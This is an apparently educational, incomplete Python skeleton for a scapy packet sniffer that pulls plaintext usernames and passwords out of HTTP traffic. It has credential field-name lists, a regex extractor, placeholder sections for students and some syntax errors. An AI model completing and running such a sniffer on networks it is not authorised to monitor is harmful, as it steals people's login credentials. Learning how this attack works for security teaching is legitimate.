from scapy.all import *
from urllib import parse
import re

iface = # your computer's sniffing interface name

def get_login_pass(body):
    user = None
    passwd = None
    
    userfields = ['login', 'user', 'uname', 'username', 'nickname', 'userid', 'login_id', 
'sessionkey', 'session_key', 'uname']
    
    passfields = ['password', 'passphrase', 'pass', 'passwd']
    
    for login in userfields:
      login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
      if login_re:
        user = login_re.group()
    
    ## Repeat the same block of code above for the password field
    ## -------------
    ## Your code goes here
    ## -------------
    
    if user and passwd:
      # return both
      ## -------------
      ## Your code goes here
      ## -------------

      
      
  def pkt_parser(packet):
    try:
        ## if packet.haslayer is TCP and Raw and IP
            ## store TCP payload in a variable
            ## call the get_login_pass function and pass the variable, store the return 
value in a variable as a list
            ## check if the return value is not empty and
                ## print TCP payload
                ## print(parse.unquote(variable[0])) for username
                ## print(parse.unquote(variable[1])) for password
        ## else:
            pass
    ## --------------
    ## Your code goes here
    ## ---------------
    
    
    
main():
    try:
        sniff(iface=iface, prn=pkt_parser, store=0)
    except KeyboardInterrupt:
        print('Exiting..')
        exit()
if __name__ == "__main__":
    main()
    
    
